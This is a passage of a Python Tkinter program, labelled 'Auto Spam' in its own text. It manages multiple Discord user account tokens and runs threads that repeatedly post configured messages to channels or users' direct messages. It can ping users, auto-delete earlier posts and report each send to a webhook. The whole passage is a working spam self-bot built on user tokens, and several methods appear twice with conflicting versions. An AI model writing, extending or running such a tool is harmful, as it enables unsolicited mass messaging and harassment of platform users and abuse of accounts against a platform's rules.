                    if messagebox.askyesno("Confirm Stop", f"Are you sure you want to stop the spam for channel {channel_id}?"):
                        self.stop_single_spam(status_key)
                else:
                    channel_config = self.get_specific_channel_config(channel_id, token_name)
                    if channel_config:
                        self.start_single_spam(channel_config)

    def get_channel_config(self, channel_id):
        for channel in self.config['channels']:
            if channel['channel_id'] == channel_id:
                return channel
        return None

    def _on_mousewheel(self, event):
        self.canvas.yview_scroll(int(-1*(event.delta/120)), "units")

    def toggle_dm_channel(self):
        if self.is_dm_var.get():
            self.channel_id_entry.delete(0, tk.END)
            self.channel_id_entry.insert(0, "Enter User ID for DM")
        else:
            self.channel_id_entry.delete(0, tk.END)
            self.channel_id_entry.insert(0, "Enter Channel ID")

    def update_status_display(self):
        """Update the status tree with all configurations and their current status"""
        try:
            if not hasattr(self, 'status_tree') or not self.status_tree.winfo_exists():
                return

            # Clear existing items safely
            try:
                for item in self.status_tree.get_children():
                    self.status_tree.delete(item)
            except tk.TclError:
                return  # Widget was destroyed, exit early

            total_messages = 0
            current_time = time.time()

            with self.channel_status_lock:
                # Group configurations by channel_id
                channel_configs = {}
                for channel in self.config.get("channels", []):
                    channel_id = channel["channel_id"]
                    if channel_id not in channel_configs:
                        channel_configs[channel_id] = []
                    channel_configs[channel_id].append(channel)

                # Process each channel and its configurations
                for channel_id, configs in channel_configs.items():
                    token_statuses = {}
                    for config in configs:
                        token_name = config.get("token_name", "")
                        if not token_name:
                            continue
                        
                        # Create unique status key
                        status_key = f"{channel_id}_{token_name}"

                        # Get or create status info with safe defaults
                        status_info = self.channel_status.get(status_key, {
                            'status': 'Stopped',
                            'message_count': 0,
                            'start_time': None,
                            'last_message_time': None
                        })

                        token_statuses[token_name] = status_info
                        total_messages += status_info.get('message_count', 0)

                    # Add each configuration to the status tree
                    for token_name, status_info in token_statuses.items():
                        try:
                            # Calculate running time
                            running_time = "--"
                            if status_info.get('start_time'):
                                if status_info['status'] == 'Running':
                                    running_time = self.format_time_difference(current_time - status_info['start_time'])
                                elif status_info.get('stop_time'):
                                    running_time = self.format_time_difference(status_info['stop_time'] - status_info['start_time'])

                            # Calculate last message time
                            last_message = "--"
                            if status_info.get('last_message_time'):
                                last_message_diff = current_time - status_info['last_message_time']
                                if last_message_diff < 60:
                                    last_message = f"{int(last_message_diff)} sec ago"
                                elif last_message_diff < 3600:
                                    last_message = f"{int(last_message_diff/60)} min ago"
                                else:
                                    last_message = f"{int(last_message_diff/3600)} hr ago"

                            # Find the specific configuration
                            config = next((c for c in configs if c.get("token_name") == token_name), None)
                            if config:
                                channel_name = config.get("channel_name", "")
                                display_name = f"{channel_name} - " if channel_name else ""

                                self.status_tree.insert("", "end", text=channel_id, values=(
                                    display_name + channel_id,
                                    token_name,
                                    status_info['status'],
                                    running_time,
                                    str(status_info.get('message_count', 0)),
                                    last_message,
                                    "Stop" if status_info['status'] == 'Running' else "Start"
                                ))
                        except tk.TclError:
                            return  # Exit if widget was destroyed during update

                # Update total messages label safely
                if hasattr(self, 'total_messages_label') and self.total_messages_label.winfo_exists():
                    self.total_messages_label.config(text=f"Total Messages Sent: {total_messages}")

            # Schedule next update with error handling
            if hasattr(self, 'status_update_job'):
                self.master.after_cancel(self.status_update_job)
            self.status_update_job = self.master.after(1000, self.update_status_display)

        except Exception as e:
            logging.error(f"Error in update_status_display: {str(e)}")
            # Try to reschedule even if there was an error
            if hasattr(self, 'master') and self.master.winfo_exists():
                self.master.after(1000, self.update_status_display)
    
    def update_token_listbox(self):
        try:
            self.token_listbox.delete(0, tk.END)
            if "tokens" in self.config and isinstance(self.config["tokens"], dict):
                for token_name in self.config["tokens"]:
                    self.token_listbox.insert(tk.END, token_name)
            else:
                logging.error("Invalid tokens configuration")
        except Exception as e:
            logging.error(f"Error in update_token_listbox: {str(e)}")
            messagebox.showerror("Error", f"Failed to update token listbox: {str(e)}")

    def test_webhook_connection(self):
        webhook_url = self.webhook_url_entry.get()
        webhook_channel_id = self.webhook_channel_id_entry.get()

        if not webhook_url:
            messagebox.showerror("Error", "Webhook URL is not set. Please enter a webhook URL.")
            return

        if not webhook_channel_id:
            messagebox.showerror("Error", "Webhook Channel ID is not set. Please enter a Webhook Channel ID.")
            return

        current_time = time.strftime("%I:%M:%S %p")

        embed = {
            "title": "🔮 Auto Message Test Log",
            "color": 0x9B59B6,
            "fields": [
                {"name": "🔔 Status", "value": "Test message sent successfully", "inline": False},
                {"name": "💬 Channel", "value": f"<#{webhook_channel_id}>", "inline": True},
                {"name": "🕒 Time", "value": current_time, "inline": True},
                {"name": "📝 Message", "value": "```This is a test message from Auto Spam by Tann18.```", "inline": False},
            ],
            "footer": {"text": "Auto Post Message | Creator: Tann18"}
        }

        payload = {
            "embeds": [embed],
            "username": "Auto Message Test Log"
        }

        try:
            logging.info(f"Sending test webhook payload: {payload}")
            response = requests.post(webhook_url, json=payload, timeout=10, verify=self.cert_path)
            response.raise_for_status()
            messagebox.showinfo("Success", "Webhook test successful! Check your Discord channel for the test message.")
            logging.info(f"Webhook test successful. Status code: {response.status_code}")
            logging.info(f"Webhook response: {response.text}")
        except requests.exceptions.RequestException as e:
            error_message = f"Failed to send test webhook: {str(e)}"
            logging.error(error_message)
            if hasattr(e, 'response'):
                logging.error(f"Response status code: {e.response.status_code}")
                logging.error(f"Response content: {e.response.text}")
            else:
                logging.error("No response object available")
            messagebox.showerror("Webhook Test Error", error_message)

    def add_config(self):
        try:
            channel_id = self.channel_id_entry.get()
            # Konversi channel_name ke string dan strip whitespace
            channel_name = str(self.channel_name_entry.get()).strip() if hasattr(self, 'channel_name_entry') else ''
            message = self.message_text.get("1.0", tk.END).strip()
            ping_user = self.ping_user_entry.get()

            if not channel_id or not message:
                messagebox.showerror("Error", "Channel/User ID and Text to Post must be filled")
                return

            time_config = {}
            for unit in ["weeks", "days", "hours", "minutes", "seconds"]:
                value = getattr(self, f"{unit}_entry").get()
                if value:
                    try:
                        time_config[unit] = int(value)
                    except ValueError:
                        messagebox.showerror("Error", f"Invalid value for {unit}")
                        return

            if not time_config:
                messagebox.showerror("Error", "At least one time unit must be set")
                return

            auto_delete = self.auto_delete_var.get()

            if not self.selected_token.get():
                messagebox.showerror("Error", "Please select a token first")
                return

            new_config = {
                "channel_id": channel_id,
                "channel_name": channel_name,  # Sekarang ini pasti string
                "message": message,
                "time_config": time_config,
                "is_dm": self.is_dm.get(),
                "ping_user": ping_user,
                "auto_delete": auto_delete,
                "token_name": self.selected_token.get()
            }

            self.config["channels"].append(new_config)
            self.save_config()
            messagebox.showinfo("Success", "Configuration added successfully")
            logging.info(f"New configuration added for {'DM' if self.is_dm.get() else 'channel'} {channel_id} (Name: {channel_name}) using token {self.selected_token.get()}")

            self.clear_entries()
            self.start_single_spam(new_config)
            self.update_channel_status()

        except Exception as e:
            print(f"Error in add_config: {str(e)}")
            import traceback
            traceback.print_exc()
            messagebox.showerror("Error", f"An error occurred: {str(e)}")

    def update_time_running(self):
        if self.is_running:
            elapsed_time = datetime.now() - self.start_time
            hours, remainder = divmod(int(elapsed_time.total_seconds()), 3600)
            minutes, seconds = divmod(remainder, 60)
            time_string = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
            self.time_running_label.config(text=f"Time Running: {time_string}")
            self.master.after(1000, self.update_time_running)

    def load_tokens(self):
        if 'tokens' in self.config:
            for token_name in self.config['tokens']:
                self.token_listbox.insert(tk.END, token_name)

    def update_token_listbox(self):
        try:
            self.token_listbox.delete(0, tk.END)
            if "tokens" in self.config and isinstance(self.config["tokens"], dict):
                for token_name in self.config["tokens"]:
                    self.token_listbox.insert(tk.END, token_name)
            else:
                logging.error("Invalid tokens configuration")
        except Exception as e:
            logging.error(f"Error in update_token_listbox: {str(e)}")
            messagebox.showerror("Error", f"Failed to update token listbox: {str(e)}")

    def select_token(self):
        selection = self.token_listbox.curselection()
        if selection:
            index = selection[0]
            token_name = self.token_listbox.get(index)
            self.selected_token.set(token_name)
            self.selected_token_label.config(text=f"Selected Token: {token_name}")
        else:
            messagebox.showerror("Error", "Please select a token from the list")

    def add_token(self):
        new_token_name = simpledialog.askstring("Add Token", "Enter a name for the new token (e.g., Account Name):")
        if new_token_name:
            new_token_value = simpledialog.askstring("Add Token", f"Enter the auth token for {new_token_name}:")
            if new_token_value:
                self.config["tokens"][new_token_name] = new_token_value
                self.save_config()
                self.update_token_listbox()
                messagebox.showinfo("Success", f"Token for {new_token_name} added successfully")
            else:
                messagebox.showwarning("Warning", "Token addition cancelled. No token value provided.")
        else:
            messagebox.showwarning("Warning", "Token addition cancelled. No name provided.")

    def remove_token(self):
        selection = self.token_listbox.curselection()
        if selection:
            index = selection[0]
            token_name = self.token_listbox.get(index)
            del self.config["tokens"][token_name]
            self.save_config()
            self.update_token_listbox()
            if self.selected_token.get() == token_name:
                self.selected_token.set("")
                self.selected_token_label.config(text="Selected Token: None")
        else:
            messagebox.showerror("Error", "Please select a token to remove")

    def clear_entries(self):
        self.channel_id_entry.delete(0, tk.END)
        self.message_text.delete("1.0", tk.END)
        self.ping_user_entry.delete(0, tk.END)
        for unit in ["weeks", "days", "hours", "minutes", "seconds"]:
            getattr(self, f"{unit}_entry").delete(0, tk.END)
        self.auto_delete_var.set(False)

    def show_delete_dialog(self):
        if not self.config["channels"]:
            messagebox.showinfo("Info", "No configurations to delete")
            return

        delete_window = tk.Toplevel(self.master)
        delete_window.title("Delete Configuration")
        delete_window.geometry("400x300")

        listbox = tk.Listbox(delete_window, width=50)
        listbox.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

        for idx, channel in enumerate(self.config["channels"]):
            listbox.insert(tk.END, f"{idx + 1}. Channel: {channel['channel_id']}, Message: {channel['message'][:30]}...")

        def delete_selected():
            selection = listbox.curselection()
            if not selection:
                messagebox.showerror("Error", "Select a configuration to delete")
                return

            idx = selection[0]
            deleted_channel = self.config["channels"][idx]["channel_id"]
            del self.config["channels"][idx]
            self.save_config()
            messagebox.showinfo("Success", "Configuration deleted successfully")
            logging.info(f"Configuration deleted for channel {deleted_channel}")
            delete_window.destroy()

        delete_button = ttk.Button(delete_window, text="Delete", command=delete_selected)
        delete_button.pack(pady=10)
        self.update_channel_status()
        
    def start_selected_channels(self):
        selected_items = [item for item in self.status_tree.get_children() 
                          if self.status_tree.set(item, "Select") == "1"]
        if not selected_items:
            messagebox.showwarning("Warning", "No channels selected")
            return
    
        for item in selected_items:
            channel_id = self.status_tree.item(item)['text']
            channel_config = self.get_channel_config(channel_id)
            if channel_config:
                with self.channel_status_lock:
                    if channel_id not in self.channel_status or self.channel_status[channel_id]['status'] != 'Running':
                        self.start_single_spam(channel_config)
            else:
                messagebox.showerror("Error", f"Configuration for channel {channel_id} not found")
        
        self.update_status_display()

    def stop_selected_channels(self):
        selected_items = [item for item in self.status_tree.get_children() 
                          if self.status_tree.set(item, "Select") == "1"]
        if not selected_items:
            messagebox.showwarning("Warning", "No channels selected")
            return
    
        for item in selected_items:
            channel_id = self.status_tree.item(item)['text']
            with self.channel_status_lock:
                if channel_id in self.channel_status and self.channel_status[channel_id]['status'] == 'Running':
                    self.stop_single_spam(channel_id)
        
        self.update_status_display()

    def format_time_config(self, time_config):
        formatted = []
        for unit, value in time_config.items():
            if value > 0:
                formatted.append(f"{value}{unit[0]}")
        return " ".join(formatted) if formatted else "Instant"

    def format_time_difference(self, time_diff):
        hours, remainder = divmod(int(time_diff), 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

    def show_channel_selection(self, title):
        selection_window = tk.Toplevel(self.master)
        selection_window.title(title)
        selection_window.geometry("400x300")

        listbox = tk.Listbox(selection_window, width=50, selectmode=tk.MULTIPLE)
        listbox.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

        for idx, channel in enumerate(self.config["channels"]):
            channel_name = channel.get("channel_name", "")
            display_name = f"{channel_name} - " if channel_name else ""
            listbox.insert(tk.END, f"{idx + 1}. {display_name}{channel['channel_id']}")

        selected_channels = []

        def on_select():
            nonlocal selected_channels
            selections = listbox.curselection()
            selected_channels = [self.config["channels"][i] for i in selections]
            selection_window.destroy()

        select_button = ttk.Button(selection_window, text="Select", command=on_select)
        select_button.pack(pady=10)

        selection_window.wait_window()
        return selected_channels    
    
    def edit_channel(self):
        selected_channels = self.show_channel_selection("Edit Channel")
        if not selected_channels:
            return

        channel = selected_channels[0]  # Edit only the first selected channel
        original_channel_id = channel["channel_id"]  # Store original channel ID

        edit_window = tk.Toplevel(self.master)
        edit_window.title("Edit Channel Configuration")
        edit_window.geometry("400x650")

        # Create a deep copy of the channel config to prevent shared references
        channel_config = copy.deepcopy(channel)

        ttk.Label(edit_window, text="Channel ID:").pack(pady=5)
        channel_id_entry = ttk.Entry(edit_window, width=50)
        channel_id_entry.insert(0, channel_config["channel_id"])
        channel_id_entry.pack(pady=5)

        ttk.Label(edit_window, text="Channel Name:").pack(pady=5)
        channel_name_entry = ttk.Entry(edit_window, width=50)
        channel_name_entry.insert(0, channel_config.get("channel_name", ""))
        channel_name_entry.pack(pady=5)

        ttk.Label(edit_window, text="Message:").pack(pady=5)
        message_text = tk.Text(edit_window, height=5, width=50)
        message_text.insert("1.0", channel_config["message"])
        message_text.pack(pady=5)

        ttk.Label(edit_window, text="Time Interval:").pack(pady=5)
        time_frame = ttk.Frame(edit_window)
        time_frame.pack(pady=5)

        time_entries = {}
        for unit in ["weeks", "days", "hours", "minutes", "seconds"]:
            ttk.Label(time_frame, text=f"{unit.capitalize()}:").pack(side=tk.LEFT)
            entry = ttk.Entry(time_frame, width=5)
            entry.insert(0, str(channel_config["time_config"].get(unit, "")))
            entry.pack(side=tk.LEFT, padx=2)
            time_entries[unit] = entry

        ttk.Label(edit_window, text="Ping User ID:").pack(pady=5)
        ping_user_entry = ttk.Entry(edit_window, width=50)
        ping_user_entry.insert(0, channel_config.get("ping_user", ""))
        ping_user_entry.pack(pady=5)

        is_dm_var = tk.BooleanVar(value=channel_config.get("is_dm", False))
        ttk.Checkbutton(edit_window, text="Send as DM", variable=is_dm_var).pack(pady=5)

        auto_delete_var = tk.BooleanVar(value=channel_config.get("auto_delete", False))
        ttk.Checkbutton(edit_window, text="Auto Delete Previous Message", variable=auto_delete_var).pack(pady=5)

        # Token selection with individual config
        ttk.Label(edit_window, text="Token:").pack(pady=5)
        token_combobox = ttk.Combobox(edit_window, values=list(self.config["tokens"].keys()))
        current_token = channel_config.get("token_name", "")
        token_combobox.set(current_token)
        token_combobox.pack(pady=5)

        def save_changes():
            try:
                # Create new config for this specific channel
                new_config = {
                    "channel_id": channel_id_entry.get(),
                    "channel_name": channel_name_entry.get(),
                    "message": message_text.get("1.0", tk.END).strip(),
                    "time_config": {unit: int(entry.get()) for unit, entry in time_entries.items() if entry.get()},
                    "ping_user": ping_user_entry.get(),
                    "is_dm": is_dm_var.get(),
                    "auto_delete": auto_delete_var.get(),
                    "token_name": token_combobox.get()
                }

                # Update only the specific channel in the configuration
                updated = False
                for i, ch in enumerate(self.config["channels"]):
                    if ch["channel_id"] == original_channel_id:
                        self.config["channels"][i] = new_config
                        updated = True
                        break

                if not updated:
                    messagebox.showerror("Error", "Failed to find original channel configuration")
                    return

                # Save the configuration
                self.save_config()

                # Update status for this specific channel
                with self.channel_status_lock:
                    for status_id in list(self.channel_status.keys()):
                        if status_id.startswith(original_channel_id):
                            # Update or remove status based on token change
                            if status_id == f"{original_channel_id}_{new_config['token_name'][:8]}":
                                self.channel_status[status_id].update({
                                    'channel_id': new_config['channel_id'],
                                    'token': new_config['token_name'][:8],
                                    'time_config': new_config['time_config']
                                })
                            else:
                                # Remove old status if token changed
                                del self.channel_status[status_id]

                # Stop existing thread if running
                thread_key = f"{original_channel_id}"
                if thread_key in self.channel_threads:
                    self.stop_single_spam(original_channel_id)

                messagebox.showinfo("Success", "Channel configuration updated successfully")
                self.update_status_display()
                edit_window.destroy()

            except Exception as e:
                messagebox.showerror("Error", f"Failed to update channel configuration: {str(e)}")
                logging.error(f"Error updating channel configuration: {str(e)}")

        ttk.Button(edit_window, text="Save Changes", command=save_changes).pack(pady=10)
        ttk.Button(edit_window, text="Cancel", command=edit_window.destroy).pack(pady=5)

    def save_settings(self):
        """Save all settings while maintaining individual channel configurations"""
        try:
            # Save webhook configurations
            self.config["webhook_url"] = self.webhook_url_entry.get()
            self.config["webhook_channel_id"] = self.webhook_channel_id_entry.get()

            # Save token configurations without affecting channels
            for token_name in self.config["tokens"].copy():
                token_value = self.config["tokens"][token_name]
                self.config["tokens"][token_name] = token_value

            # Save channel configurations individually
            for channel in self.config["channels"]:
                channel_id = channel["channel_id"]
                # Create a deep copy to prevent shared references
                channel_copy = copy.deepcopy(channel)

                # Update the channel while preserving its individual token configuration
                for i, existing_channel in enumerate(self.config["channels"]):
                    if existing_channel["channel_id"] == channel_id:
                        self.config["channels"][i] = channel_copy
                        break

            self.save_config()
            logging.info("Settings saved successfully")
            logging.info(f"Number of tokens: {len(self.config['tokens'])}")
            logging.info(f"Number of channels: {len(self.config['channels'])}")
            messagebox.showinfo("Success", "Settings saved successfully")

        except Exception as e:
            error_msg = f"Error saving settings: {str(e)}"
            logging.error(error_msg)
            messagebox.showerror("Error", error_msg)

    def start_single_spam(self, config):
        channel_id = config["channel_id"]
        token_name = config.get("token_name")

        if not token_name or token_name not in self.config["tokens"]:
            messagebox.showerror("Error", f"Invalid token configuration for channel {channel_id}.")
            logging.error(f"Failed to start spam for channel {channel_id}: Invalid token configuration.")
            return

        token = self.config["tokens"][token_name]

        # Create a unique thread identifier that includes both channel and token
        thread_key = f"{channel_id}_{token_name}"

        # Directly create and start the thread
        thread = threading.Thread(
            target=self.spam_loop,
            args=(
                channel_id,
                config["message"],
                token,
                config["time_config"],
                config.get("ping_user"),
                config.get("auto_delete", False),
                config.get("is_dm", False),
                token_name
            )
        )
        thread.daemon = True
        thread.stop_flag = False  # Add a stop flag to each thread

        try:
            # Remove any existing thread with this key
            if thread_key in self.channel_threads:
                old_thread = self.channel_threads[thread_key]
                if old_thread.is_alive():
                    old_thread.stop_flag = True
                    old_thread.join(timeout=1)

            # Store and start the new thread
            self.channel_threads[thread_key] = thread
            thread.start()

            with self.channel_status_lock:
                status_key = f"{channel_id}_{token_name}"
                self.channel_status[status_key] = {
                    "start_time": time.time(),
                    "status": "Running",
                    "message_count": 0,
                    "last_message_time": None,
                    "time_config": config['time_config'],
                    "token": token_name,
                    "channel_id": channel_id
                }

            self.update_status_display()

            channel_name = config.get("channel_name", "")
            display_name = f"{channel_name} - " if channel_name else ""
            message = f"Spam thread started for {'DM' if config.get('is_dm', False) else 'channel'} {display_name}{channel_id} using token {token_name}"

            messagebox.showinfo("Started", message)
            logging.info(message)

        except Exception as e:
            error_message = f"Failed to start spam thread for channel {channel_id}: {str(e)}"
            messagebox.showerror("Error", error_message)
            logging.error(error_message)

            with self.channel_status_lock:
                if thread_key in self.channel_threads:
                    del self.channel_threads[thread_key]

                status_key = f"{channel_id}_{token_name}"
                if status_key in self.channel_status:
                    self.channel_status[status_key]["status"] = "Failed to Start"

            self.update_status_display()

    def get_channel_running_time(self, channel_id):
        with self.channel_status_lock:
            if channel_id in self.channel_status:
                start_time = self.channel_status[channel_id]["start_time"]
                stop_time = self.channel_status[channel_id].get("stop_time", time.time())
                return stop_time - start_time
        return 0

    def stop_single_spam(self, status_key):
        """Stop spam for a specific configuration identified by its unique status key"""
        try:
            # Split the status key to get channel_id and token_name
            channel_id, token_name = status_key.split('_', 1)

            with self.channel_status_lock:
                # Ensure thread exists and is alive before stopping
                if status_key in self.channel_threads:
                    thread = self.channel_threads[status_key]
                    if thread and thread.is_alive():
                        thread.stop_flag = True  # Signal the thread to stop
                        thread.join(timeout=2)  # Wait for thread to terminate

                    # Remove the thread from tracking
                    del self.channel_threads[status_key]

                # Update the status for this specific configuration
                if status_key in self.channel_status:
                    self.channel_status[status_key]['status'] = 'Stopped'
                    self.channel_status[status_key]['stop_time'] = time.time()

            self.update_status_display()

            logging.info(f"Stopped spam for channel {channel_id} with token {token_name}")
            messagebox.showinfo("Stopped", f"Spam stopped for channel {channel_id}")

        except Exception as e:
            logging.error(f"Error stopping spam for {status_key}: {str(e)}")
            messagebox.showerror("Error", f"Failed to stop spam: {str(e)}")

    def get_specific_channel_config(self, channel_id, token_name):
        """Find a specific channel configuration matching both channel_id and token_name"""
        for channel in self.config["channels"]:
            if (channel["channel_id"] == channel_id and 
                channel.get("token_name") == token_name):
                return channel
        return None

    def load_initial_configurations(self):
        for channel_config in self.config["channels"]:
            channel_id = channel_config["channel_id"]
            with self.channel_status_lock:
                self.channel_status[channel_id] = {
                    "status": "Stopped",
                    "message_count": 0,
                    "last_message_time": None,
                    "time_config": channel_config['time_config']
                }
        self.update_status_display()

    def start_all_spam_with_status(self):
        self.stop_event.clear()
        if not self.config["channels"]:
            messagebox.showerror("Error", "No channels configured. Please add at least one configuration.")
            return
        for channel in self.config["channels"]:
            self.start_single_spam(channel)
        self.is_running = True
        self.start_time = datetime.now()
        self.overall_status_label.config(text="Overall Status: Running")
        self.update_status_display()

    def stop_spam_with_status(self):
        """Stop all spam threads and update their status"""
        # Set the global stop event
        self.stop_event.set()

        try:
            # Get all running thread keys
            thread_keys = list(self.channel_threads.keys())

            # Stop each thread individually
            for thread_key in thread_keys:
                channel_id = thread_key.split('_')[0]
                token_name = thread_key.split('_')[1]

                # Get the thread object
                thread = self.channel_threads.get(thread_key)
                if thread and thread.is_alive():
                    # Set thread-specific stop flag
                    if hasattr(thread, 'stop_flag'):
                        thread.stop_flag = True

                    # Wait for thread to finish (with timeout)
                    thread.join(timeout=2)

                    # If thread is still alive after timeout, try to terminate it
                    if thread.is_alive():
                        logging.warning(f"Thread for channel {channel_id} with token {token_name} didn't stop gracefully")

                    # Remove thread from tracking
                    self.channel_threads.pop(thread_key, None)

                # Update status for this channel-token combination
                status_key = f"{channel_id}_{token_name}"
                with self.channel_status_lock:
                    if status_key in self.channel_status:
                        self.channel_status[status_key].update({
                            'status': 'Stopped',
                            'stop_time': time.time()
                        })

            # Clear all thread references
            self.channel_threads.clear()
            self.is_running = False

            # Update UI elements
            if hasattr(self, 'overall_status_label'):
                self.overall_status_label.config(text="Overall Status: Stopped")

            self.update_status_display()
            messagebox.showinfo("Stopped", "All spam threads have been stopped")
            logging.info("All spam threads stopped successfully")

        except Exception as e:
            logging.error(f"Error in stop_spam_with_status: {str(e)}")
            messagebox.showerror("Error", f"Error stopping spam threads: {str(e)}")

    def spam_loop(self, channel_id, message, token, time_config, ping_user=None, auto_delete=False, is_dm=False, token_name=None):
        """Modified spam loop with better stop handling"""
        thread = threading.current_thread()
        thread.stop_flag = False
        
        headers = {
            'authorization': token,
            'content-type': 'application/json'
        }
    
        status_key = f"{channel_id}_{token_name}"
        
        while not thread.stop_flag and not self.stop_event.is_set():
            try:
                # Calculate delay
                delay = self.calculate_delay(time_config)
                
                # Send message
                if is_dm:
                    url = f'https://discord.com/api/v9/users/@me/channels'
                    dm_channel_payload = {'recipient_id': channel_id}
                    
                    dm_response = requests.post(url, headers=headers, json=dm_channel_payload, verify=self.cert_path)
                    if dm_response.status_code == 200:
                        dm_channel_id = dm_response.json()['id']
                        url = f'https://discord.com/api/v9/channels/{dm_channel_id}/messages'
                    else:
                        raise Exception(f"Failed to create DM channel: {dm_response.status_code}")
                else:
                    url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
    
                payload = {'content': message}
                response = requests.post(url, headers=headers, json=payload, verify=self.cert_path)
                
                success = response.status_code == 200
                
                # Update message count and last message time
                with self.channel_status_lock:
                    if status_key in self.channel_status:
                        self.channel_status[status_key]['message_count'] = self.channel_status[status_key].get('message_count', 0) + 1
                        self.channel_status[status_key]['last_message_time'] = time.time()
                
                # Send webhook
                self.send_webhook(channel_id, message, success, time_config, ping_user, is_dm)
                
                # Auto delete if enabled
                if success and auto_delete:
                    message_id = response.json()['id']
                    delete_url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}'
                    requests.delete(delete_url, headers=headers, verify=self.cert_path)
                
                # Check stop conditions before sleep
                if thread.stop_flag or self.stop_event.is_set():
                    break
                    
                # Sleep with periodic stop check
                sleep_start = time.time()
                while time.time() - sleep_start < delay:
                    if thread.stop_flag or self.stop_event.is_set():
                        return
                    time.sleep(min(0.5, delay))  # Check every 0.5 seconds or less
                    
            except Exception as e:
                logging.error(f"Error in spam loop for channel {channel_id}: {str(e)}")
                self.send_webhook(channel_id, message, False, time_config, ping_user, is_dm)
                
                # Check stop conditions before continuing
                if thread.stop_flag or self.stop_event.is_set():
                    break
                    
                time.sleep(5)  # Wait before retrying after error
    
        # Update status when loop ends
        with self.channel_status_lock:
            if status_key in self.channel_status:
                self.channel_status[status_key]['status'] = 'Stopped'
                self.channel_status[status_key]['stop_time'] = time.time()
        
        self.update_status_display()
    
    def update_running_threads_display(self):
        if not hasattr(self, 'status_tree') or self.status_tree is None:
            return

        for item in self.status_tree.get_children():
            self.status_tree.delete(item)

        with self.channel_status_lock:
            for channel_id, status in self.channel_status.items():
                if status['status'] == 'Running':
                    channel_name = self.get_channel_name(channel_id)
                    running_time = self.format_time_difference(time.time() - status['start_time'])
                    last_message = self.format_time_difference(time.time() - status['last_message_time']) if status['last_message_time'] else "Never"

                    self.status_tree.insert("", "end", text=channel_id, values=(
                        channel_name,
                        status['status'],
                        running_time,
                        str(status['message_count']),
                        last_message
                    ))

        self.master.after(3000, self.update_running_threads_display)

    def update_channel_status_display(self):
        if not hasattr(self, 'running_threads_frame'):
            logging.error("running_threads_frame not initialized")
            return

        for widget in self.running_threads_frame.winfo_children():
            widget.destroy()

        row = 0
        for channel_id, status in self.channel_status.items():
            ttk.Label(self.running_threads_frame, text=f"Channel: {channel_id}").grid(row=row, column=0, sticky='w')
            ttk.Label(self.running_threads_frame, text=f"Status: {status['status']}").grid(row=row, column=1, sticky='w')
            ttk.Label(self.running_threads_frame, text=f"Messages: {status['message_count']}").grid(row=row, column=2, sticky='w')
            row += 1

        # Schedule the next update
        self.master.after(1000, self.update_channel_status_display)

    def get_channel_name(self, channel_id):
        for channel in self.config.get("channels", []):
            if channel.get("channel_id") == channel_id:
                return channel.get("channel_name", f"Channel {channel_id}")
        return f"Channel {channel_id}"

    def format_time_difference(self, time_diff):
        hours, remainder = divmod(int(time_diff), 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

    def send_discord_message(self, token, channel_id, message, last_message_id=None, is_dm=False):
        try:
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }

            # Handle DM creation if needed
            if is_dm:
                api_url = f"https://discord.com/api/v9/users/@me/channels"
                dm_payload = {"recipient_id": channel_id}

                dm_response = requests.post(
                    api_url, 
                    headers=headers,
                    json=dm_payload,
                    timeout=10,
                    verify=self.cert_path
                )

                if dm_response.status_code == 200:
                    channel_id = dm_response.json()['id']
                else:
                    return False, f'Failed to create DM channel: {dm_response.text}', None

            # Delete previous message if needed
            if last_message_id and not is_dm:
                try:
                    delete_url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{last_message_id}"
                    requests.delete(
                        delete_url,
                        headers=headers,
                        timeout=10,
                        verify=self.cert_path
                    )
                except Exception as e:
                    logging.warning(f"Failed to delete previous message: {str(e)}")
                    # Continue even if delete fails

            # Send new message
            api_url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
            payload = {'content': message}

            response = requests.post(
                api_url,
                headers=headers,
                json=payload,
                timeout=10,
                verify=self.cert_path
            )

            if response.status_code == 200:
                return True, 'Message sent successfully!', response.json().get('id')
            else:
                error_msg = f'Failed to send message: {response.status_code} - {response.text}'
                return False, error_msg, None

        except requests.exceptions.RequestException as e:
            error_msg = f'Request failed: {str(e)}'
            logging.error(error_msg)
            return False, error_msg, None
        except Exception as e:
            error_msg = f'Unexpected error: {str(e)}'
            logging.error(error_msg)
            return False, error_msg, None

    def update_channel(self, channel_id, new_config):
        """Update a specific channel configuration"""
        updated = False
        for i, channel in enumerate(self.config["channels"]):
            if channel["channel_id"] == channel_id:
                self.config["channels"][i] = new_config
                updated = True
                break
            
        if updated:
            self.save_config()
            # Update status only for this specific channel
            with self.channel_status_lock:
                status_key = f"{channel_id}_{new_config['token_name'][:8]}"
                if status_key in self.channel_status:
                    self.channel_status[status_key].update({
                        'time_config': new_config['time_config'],
                        'token': new_config['token_name'][:8]
                    })
    
        return updated

    def update_channel_status(self):
        with self.channel_status_lock:
            # Hapus status untuk channel yang sudah tidak ada
            channels_to_remove = [channel_id for channel_id in self.channel_status 
                                  if not self.get_channel_config(channel_id)]
            for channel_id in channels_to_remove:
                del self.channel_status[channel_id]

            # Perbarui atau tambahkan status untuk channel yang ada
            for channel in self.config['channels']:
                channel_id = channel['channel_id']
                if channel_id not in self.channel_status:
                    self.channel_status[channel_id] = {
                        'status': 'Stopped',
                        'message_count': 0,
                        'start_time': None,
                        'last_message_time': None,
                        'time_config': channel['time_config']
                    }
                else:
                    self.channel_status[channel_id]['time_config'] = channel['time_config']

        # Trigger pembaruan tampilan
        self.master.after(0, self.update_status_display)

    def stop_spam_with_status(self):
        self.stop_event.set()
        for channel_id in list(self.channel_threads.keys()):
            self.stop_single_spam(channel_id)
        self.is_running = False
        self.overall_status_label.config(text="Overall Status: Stopped")
        messagebox.showinfo("Stopped", "All spam threads have been stopped")
        logging.info("All spam threads stopped")

    def format_time_config(self, time_config):
        formatted = []
        for unit, value in time_config.items():
            if value > 0:
                formatted.append(f"{value} {unit}")
        return " ".join(formatted) if formatted else "Instant"

    def calculate_delay(self, time_config):
        """Calculate delay in seconds from time configuration"""
        total_seconds = 0

        if 'weeks' in time_config:
            total_seconds += time_config['weeks'] * 7 * 24 * 3600
